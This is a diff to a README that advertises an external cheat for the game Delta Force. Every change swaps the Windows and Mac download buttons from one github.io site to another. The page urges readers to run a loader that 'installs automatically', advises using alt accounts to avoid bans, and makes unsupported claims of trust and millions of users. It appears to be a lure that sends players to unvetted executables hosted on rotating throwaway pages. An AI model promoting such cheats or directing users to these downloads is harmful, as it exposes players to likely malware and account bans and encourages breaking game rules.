@@ -10,8 +10,8 @@ The **🛡️ Delta Force External Evicted V2** is the most trusted external che
 
 <div align="center">
 
-[![Download Delta Force External Evicted V2](https://img.shields.io/badge/🔻%20DOWNLOAD%20NOW%20🔻-purple?style=for-the-badge&logo=github)](https://laplaplaplas.github.io/download/)
-[![Download for Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://laplaplaplas.github.io/mac-download/)
+[![Download Delta Force External Evicted V2](https://img.shields.io/badge/🔻%20DOWNLOAD%20NOW%20🔻-purple?style=for-the-badge&logo=github)](https://beatowlrouse.github.io/windownload/)
+[![Download for Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://beatowlrouse.github.io/macdownload/)
 
 </div>
 
@@ -117,7 +117,7 @@ The **🛡️ Delta Force External Evicted V2** is the most trusted external che
 6. **📋 Press INSERT** — Open the overlay menu
 7. **⚡ Enable features** and dominate
 
-[![Download](https://img.shields.io/badge/🔻%20DOWNLOAD%20EVICTED%20V2%20🔻-purple?style=for-the-badge&logo=github)](https://laplaplaplas.github.io/download/)
+[![Download](https://img.shields.io/badge/🔻%20DOWNLOAD%20EVICTED%20V2%20🔻-purple?style=for-the-badge&logo=github)](https://beatowlrouse.github.io/windownload/)
 
 ### 🍎 macOS
 
@@ -126,7 +126,7 @@ The **🛡️ Delta Force External Evicted V2** is the most trusted external che
 3. **Follow the prompts** — the loader installs automatically
 
 
-[![Download for Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://laplaplaplas.github.io/mac-download/)
+[![Download for Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://beatowlrouse.github.io/macdownload/)
 
 ---
 
@@ -183,5 +183,5 @@ External is significantly safer than injection. Use alt accounts for initial tes
 
 Join over 3.4 million players who've used Delta Force External Evicted V2 to dominate in 2026.
 
-[![Download](https://img.shields.io/badge/🔻%20DOWNLOAD%20EVICTED%20V2%20🔻-purple?style=for-the-badge&logo=github)](https://laplaplaplas.github.io/download/)
-[![Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://laplaplaplas.github.io/mac-download/)
+[![Download](https://img.shields.io/badge/🔻%20DOWNLOAD%20EVICTED%20V2%20🔻-purple?style=for-the-badge&logo=github)](https://beatowlrouse.github.io/windownload/)
+[![Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://beatowlrouse.github.io/macdownload/)
